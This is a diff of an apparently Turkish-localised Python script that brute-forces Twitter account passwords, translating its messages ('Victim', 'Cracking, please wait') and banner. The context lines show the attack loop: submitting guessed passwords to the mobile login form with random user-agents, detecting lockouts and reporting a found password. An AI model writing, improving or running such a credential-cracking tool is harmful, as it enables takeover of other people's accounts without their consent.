@@ -39,7 +39,7 @@ lockedOut = 'https://mobile.twitter.com/account/locked'
 def attack(password):
   try:
     global lockedOut
-    sys.stdout.write("\r trying %s..." % password)
+    sys.stdout.write("\r deneniyor %s..." % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
@@ -48,7 +48,7 @@ def attack(password):
     br.form['session[password]'] = password
     br.submit()
     if br.geturl() == lockedOut:
-      print ("\n Locked Out!\n")
+      print ("\n Kilitlendi, Çikildi.!\n")
       sys.exit(1)
     elif br.title() == "Twitter":
       print ("\n Password Found!\n")
@@ -92,14 +92,14 @@ def main():
         sys.exit(1)
     try:
         print ("""
- TURKSIBERGUVENLIK.NET
-    BIRKAN TEKKAN
+          TURKSIBERGUVENLIK.NET
+             BIRKAN TEKKAN
  ........................................                                            
 Twitter Sifre Kirma Programi
         """)
-        print (" Victim: %s" % (username))
-        print (" Loaded:" , len(passwords), "passwords")
-        print (" Cracking, please wait...")
+        print (" Kurban: %s" % (username))
+        print (" Yuklenen:" , len(passwords), "sifreler")
+        print (" Saldiri Basladi, Sifreler Deneniyor")
     except KeyboardInterrupt:
         print ("\n Exiting Zelus...")
         sys.exit(1)
